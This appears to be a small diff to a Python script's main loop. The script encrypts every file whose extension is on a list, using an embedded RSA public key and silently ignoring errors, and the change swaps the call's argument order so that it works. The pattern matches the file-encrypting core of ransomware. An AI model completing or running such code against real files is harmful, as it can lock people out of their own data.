@@ -67,7 +67,7 @@ def main():
             extension = os.path.splitext(file_pnt)[1]
             if extension in valid_extension:
                 try:
-                    rsa.encryptar(PUBLIC_KEY, str(file_pnt))
+                    rsa.encryptar(str(file_pnt), PUBLIC_KEY)
                 except:
                     pass
 
